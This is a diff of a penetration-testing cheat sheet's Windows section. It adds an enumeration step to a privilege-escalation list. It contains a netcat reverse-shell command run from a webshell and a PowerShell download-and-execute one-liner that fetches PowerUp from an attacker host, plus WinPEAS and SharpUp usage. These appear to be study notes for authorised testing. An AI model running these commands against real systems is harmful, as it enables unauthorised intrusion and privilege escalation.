@@ -29,15 +29,16 @@
 5. in a webshell windows, `\\192.168.119.159\share\nc.exe -e cmd.exe 192.168.119.159 123`
 
  # Privilege Escalation for Window
- 0. Transfer the file to Window to TMP directory using any of the above methods.
- 1. Use PowerUp.
- 2. `Import-Module .\PowerUp.ps1` or `. .\PowerUp.ps1`
- 3. `Invoke-AllChecks`
- 4. or `powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://myIP:80/PowerUp.ps1');Invoke-AllChecks"`
- 5. Use WinPeas
- 6. `winpeas.exe`
- 7. Use SharUp if you cant run winpeas or powerup 
- 8. `.\SharpUp.exe`
+ 0. `whoami` `systeminfo` `whoami /priv` Conduct basic enumeration, and look for interesting files in the directory 
+ 1. Transfer the file to Window to TMP directory using any of the above methods.
+ 2. Use PowerUp.
+ 3. `Import-Module .\PowerUp.ps1` or `. .\PowerUp.ps1`
+ 4. `Invoke-AllChecks`
+ 5. or `powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://myIP:80/PowerUp.ps1');Invoke-AllChecks"`
+ 6. Use WinPeas
+ 7. `winpeas.exe`
+ 8. Use SharUp if you cant run winpeas or powerup 
+ 9. `.\SharpUp.exe`
  
  ## Service Misconfiguration
 - `sc.exe qc <name>` Query the configuration of a service
